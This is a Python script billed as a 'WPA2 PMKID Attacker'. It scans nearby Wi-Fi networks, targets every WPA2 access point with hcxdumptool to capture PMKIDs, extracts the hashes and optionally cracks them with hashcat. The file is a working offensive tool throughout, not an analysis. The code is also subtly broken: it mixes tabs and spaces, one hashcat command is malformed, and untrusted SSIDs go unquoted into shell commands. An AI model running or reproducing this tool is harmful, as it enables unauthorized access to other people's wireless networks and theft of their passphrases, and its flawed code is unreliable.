#!/usr/bin/python

# Please ensure all dependencies are met, by running dependencies.sh
# Please make sure all tools in the dependencies are the latest version too.

import re, argparse, os, datetime, sys
from scapy.all import *

def insert_ap(pkt):
	print("[+] Scanning for networks, press CTRL + C when you wish to stop the scan and continue the program.")
    bssid = pkt[Dot11].addr3
	
    if bssid in aps:
        return
		
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    ssid, channel = None, None
    crypto = set()
	
    while isinstance(p, Dot11Elt):
	
        if p.ID == 0:
            ssid = p.info
			
        elif p.ID == 3:
            channel = ord(p.info)
			
        elif p.ID == 48:
            crypto.add("WPA2")
			
        elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
			
        p = p.payload
		
    if not crypto:
	
        if 'privacy' in cap:
            crypto.add("WEP")
			
        else:
            crypto.add("OPN")
			
    oneliner = "NEW AP: " + ssid + " [" + bssid + "], channel " + str(channel) + ", " + ' / '.join(crypto)
    print("[+] " + oneliner + ".")
    os.system("echo " + oneliner + " >> foundssids.txt")
    aps[bssid] = (ssid, channel, crypto)

def mainProgram():
	purifiedbssids = []
	newfile = open("foundssids.txt","w+")
	newfile.close()
	sniff(iface='wlan0mon', prn=insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))

	try:
	
		with open("foundssids.txt") as bssidlist:
			bssidlines = bssidlist.read().splitlines()
			
			for bssidline in bssidlines:
				wpa2bssidregex = re.search(r"NEW\sAP\:\s.*\s\[((?:[A-Fa-f0-9]{2}[:-]){5}(?:[A-Fa-f0-9]{2}))\]\,\schannel\s\d{1,2}\,\sWPA2", bssidline)
				
				if wpa2bssidregex:
					bssid = wpa2bssidregex.group(1)
					bssid = str(bssid)
					
					if ":" in bssid:
						bssid = bssid.replace(":","")
						print("[+] Found and using the bssid: " + bssid + ".")
						purifiedbssids.append(bssid)
					
					else:
						purifiedbssids.append(bssid)
						
		bssidlist.close()

	except:
		sys.exit("[-] Failed to open file: foundssids.txt.")

	filterfile = open("filter.txt", "w+")
	filterfile.close()
	count = 0
	
	for purebssid in purifiedbssids:
		print("[+] Generating filter file of BSSIDs.")
		os.system("echo " + purebssid + " >> filter.txt")
		count = count + 3
		
	timeout = count * 60
	print("[+] Finished. Now will attempt to find PMKIDs. ETC: " + str(count) + " minutes.")
	outfile = "foundhash"
	hashfile = "extractedhashes"
	
	if os.path.isfile(outfile):
		os.remove(outfile)
		
	os.system("timeout " + str(timeout) + "s hcxdumptool -o " + outfile + " -i " + args.interface + " --filterlist=filter.txt --filtermode=2 --enable_status=1,2,4,8")
	
	print("\n[+] Finished. Now extracting hashes from " + outfile + ".")
	os.system("hcxpcaptool -z " + hashfile + " " + outfile)
	
	return hashfile

def MonitorMode(interface):
	print("[+] Putting interface in monitor mode.")
	os.system("airmon-ng start " + interface)

def HashcatCrack(hashfile):
	print("[+] Now cracking hashes with Hashcat.")
	os.system("hashcat -m 16800 " + hashfile + "-q 3 -w 3 '?l?l?l?lre123' --force")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='WPA2 PMKID Attacker.')
	parser.add_argument('-c', '--crack', help='This optional argument is used to specify whether the machine should proceed to crack discovered hashes.')
	parser.add_argument('-i', '--interface', help='This necessary argument is used to specify the wireless interface. Must be in monitor mode.')
	parser.add_argument('-m', '--monitor', help='This optional argument is used to specify that the interface is not currently in monitor mode, and should be. This argument will not run airodump, not get a list of BSSIDs for you.')
	args = parser.parse_args()

	hashfile = []
	aps = {}

	if not args.interface:
		sys.exit("[-] Please specify an interface.")

	int_regex = re.search(r"\w{1,8}", args.interface)

	if not int_regex:
		sys.exit("[-] Please specify a valid interface.")

	interface = args.interface

	if args.monitor:
		MonitorMode(interface)

	hashfile = mainProgram()

	if args.crack and hashfile:
		HashcatCrack(hashfile)
